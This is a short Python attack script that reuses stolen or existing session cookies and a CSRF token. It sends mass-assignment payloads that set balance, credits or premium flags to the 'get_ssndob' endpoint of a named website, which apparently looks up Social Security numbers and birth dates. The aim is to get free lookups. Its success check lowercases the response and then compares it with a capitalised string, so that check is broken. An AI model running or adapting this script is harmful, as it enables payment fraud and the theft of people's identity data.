import requests
import re

session = requests.Session()
session.cookies.update(COOKIES)  # Your existing cookies

# Test for balance manipulation
payloads = [
    {'balance': '999999', 'credits': '999999'},  # Direct override
    {'subscription': 'active', 'tier': 'unlimited'},
    {'is_premium': '1', 'paid': 'true'}
]

for payload in payloads:
    data = {
        **{'csrfmiddlewaretoken': CSRF_TOKEN, 'firstname': 'John', 'st': 'CA'},
        **payload
    }
    resp = session.post('https://usfull.info/service/get_ssndob/', data=data)
    if 'No records found' not in resp.text.lower() and len(resp.text) > 1000:
        print("✅ Balance bypass: ", payload)